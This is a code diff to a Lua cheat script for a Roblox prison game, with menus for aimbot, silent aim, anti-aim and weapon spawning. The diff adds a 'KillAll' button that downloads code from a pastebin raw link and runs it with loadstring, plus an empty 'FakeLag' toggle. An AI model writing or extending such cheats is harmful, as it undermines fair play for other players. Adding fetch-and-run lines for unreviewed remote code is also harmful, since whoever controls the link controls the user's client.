@@ -42,6 +42,7 @@ local Tab10 = Tabs.Main2:AddRightGroupbox('SilentAim')
 local GunMod = Tabs.Main2:AddLeftTabbox()
 local AntiAim = Tabs.Main2:AddLeftGroupbox('AntiAim')
 local Tab11 = Tabs.Main3:AddLeftTabbox()
+local KillerBox = Tabs.Main2:AddLeftGroupbox('Killer')
 --[SubTabs]--
 local Tab1 = Box1:AddTab('Aimbot')
 local Tab2 = Box1:AddTab('Fov')
@@ -61,6 +62,9 @@ local Button2 = Ak47Box:AddButton('Get AK-47', function()
 end)
 local Button3 = RemingtonBox:AddButton('Get Remington', function()
     Workspace.Remote.ItemHandler:InvokeServer(Workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
+end)
+local Button4 = KillerBox:AddButton('KillAll', function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/cbCUQ7pa"))()
 end)
 
 --[Toggles]--
@@ -268,6 +272,14 @@ Toggles.Toggle22:OnChanged(function()
                 game:GetService("Players").LocalPlayer.Character.Head.Material = Enum.Material.ForceField
         end
     end)
+end)
+KillerBox:AddToggle('Toggle23', {
+    Text = 'FakeLag',
+    Default = false, -- Default value (true / false)
+    Tooltip = '', -- Information shown when you hover over the toggle
+})
+Toggles.Toggle23:OnChanged(function()
+    
 end)
 
 --[Sliders]--
